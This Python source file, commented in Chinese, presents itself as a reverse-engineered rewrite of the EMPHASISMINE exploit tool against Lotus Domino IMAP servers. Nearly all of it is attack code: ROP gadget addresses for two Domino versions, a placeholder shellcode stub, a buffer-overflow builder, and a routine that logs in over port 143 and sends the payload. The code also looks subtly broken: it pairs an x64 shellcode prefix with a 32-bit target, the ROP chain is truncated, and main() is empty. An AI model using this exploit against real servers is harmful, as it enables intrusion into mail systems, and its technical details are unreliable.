"""emphasis_mine — EMPHASISMINE Lotus Domino IMAP 利用核心逻辑。

Python 重写的 `Emphasismine-3.4.0.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Lotus Domino IMAP 利用流程。

参数定义来源：Emphasismine-3.4.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 143
DEFAULT_TIMEOUT = 60

# 每个 Lotus Domino 版本的 ROP gadget 地址（来自 XML <DominoVersion><paramgroup>）
DOMINO_VERSION_GADGETS = {
    "6.5.4": {
        "ReturnAddrOffset": 0x34C,
        "AddrPopEax": 0x00428463,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420CF5,
        "AddrPopEdi": 0x60132252,
        "AddrEaxToEsi": 0x60951039,
        "AddrCopyCode": 0x607112B4,
        "AddrIncEax": 0x60168187,
        "AddrJmpEax": 0x600A371D,
        "AddrSetAtEdxRet": 0x609DBEA1,
        "AddrClrEaxRet": 0x0042845E,
        "RetEip": 0x0041331B,
    },
    "7.0.2": {
        "AddrPopEax": 0x0042A001,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D5A7,
        "AddrPopEdi": 0x0042CB58,
        "AddrEaxToEsi": 0x100AAADD,
        "AddrCopyCode": 0x60709A24,
        "AddrIncEax": 0x600F8E54,
        "AddrJmpEax": 0x00429A6C,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x6001FAC1,
        "RetEip": 0x00413E78,
    },
}

CREDENTIAL_TYPE_VALUES = {
    "UnicodeCreds": 0,
    "PasswordHash": 1,
    "MachineHash":  2,
}

# EmphasisMine exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
EMPHASIS_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EmphasisMineError(Exception):
    pass


def _parse_hex_buffer(value):
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EmphasisMineError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EmphasisMineError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_imap_login(username, password):
    """构建 IMAP LOGIN 请求。"""
    return f"1 LOGIN {username} {password}\r\n".encode("ascii")


def build_imap_select(mailbox="INBOX"):
    """构建 IMAP SELECT 请求。"""
    return f"2 SELECT {mailbox}\r\n".encode("ascii")


def build_domino_overflow(shellcode, gadgets):
    """构建 Lotus Domino 缓冲区溢出负载。

    根据 x32dbg 分析，EmphasisMine 通过向 Domino IMAP 服务器发送
    特制的 IMAP 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    # NOP sled + 返回地址 + ROP 链 + shellcode
    nopsled = b"\x90" * 128
    ret_addr = struct.pack("<I", gadgets["RetEip"])
    rop_chain = struct.pack("<I", gadgets["AddrPopEax"])
    rop_chain += struct.pack("<I", gadgets["AddrVirtualAlloc"])
    rop_chain += struct.pack("<I", gadgets["AddrJmpEax"])
    return nopsled + ret_addr + rop_chain + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    domino_version="7.0.2",
    target_acct_usr=None,
    target_acct_pwd=None,
    credential_type="UnicodeCreds",
    username=None,
    credential=None,
    verbose=False,
):
    """执行 EMPHASISMINE 利用序列。

    阶段：
      1. TCP 连接到目标 Domino IMAP 端口 (默认 143)
      2. 发送 IMAP LOGIN 请求（若提供凭证）
      3. 发送 IMAP SELECT 请求
      4. 构建并发送 Domino 缓冲区溢出负载 (ROP + shellcode)
      5. 载荷投递
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Domino version: {domino_version}")
        print(f"[*] Target account user: {target_acct_usr}")
        print(f"[*] Credential type: {credential_type}")
        if username:
            print(f"[*] Username: {username}")
        if credential:
            print(f"[*] Credential: {credential}")

    gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["7.0.2"])
    credential_type_value = CREDENTIAL_TYPE_VALUES[credential_type]

    username_bytes = _parse_hex_buffer(username)
    credential_bytes = _parse_hex_buffer(credential)

    if verbose:
        print(f"[*] Credential type value: {credential_type_value}")
        print(f"[*] Username: {len(username_bytes)} bytes")
        print(f"[*] Credential: {len(credential_bytes)} bytes")
        print(f"[*] AddrPopEax: 0x{gadgets['AddrPopEax']:08X}")
        print(f"[*] AddrVirtualAlloc: 0x{gadgets['AddrVirtualAlloc']:08X}")
        print(f"[*] AddrJmpEax: 0x{gadgets['AddrJmpEax']:08X}")
        print(f"[*] RetEip: 0x{gadgets['RetEip']:08X}")

    # 建立 TCP 连接（IMAP 143）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EmphasisMineError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 读取 IMAP 问候语
        try:
            greeting = sock.recv(4096)
            if verbose:
                print(f"[*] IMAP 问候语: {greeting[:128]}")
        except OSError:
            pass

        # 发送 IMAP LOGIN 请求（若提供凭证）
        if target_acct_usr and target_acct_pwd:
            login_req = build_imap_login(target_acct_usr, target_acct_pwd)
            sock.sendall(login_req)
            resp = sock.recv(4096)
            if verbose:
                print(f"[*] LOGIN 应答: {resp[:128]}")

        # 发送 IMAP SELECT 请求
        select_req = build_imap_select()
        sock.sendall(select_req)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] SELECT 应答: {resp[:128]}")

        # 构建 Domino 缓冲区溢出负载
        shellcode = EMPHASIS_SHELLCODE_PLACEHOLDER
        overflow = build_domino_overflow(shellcode, gadgets)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] EMPHASISMINE 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
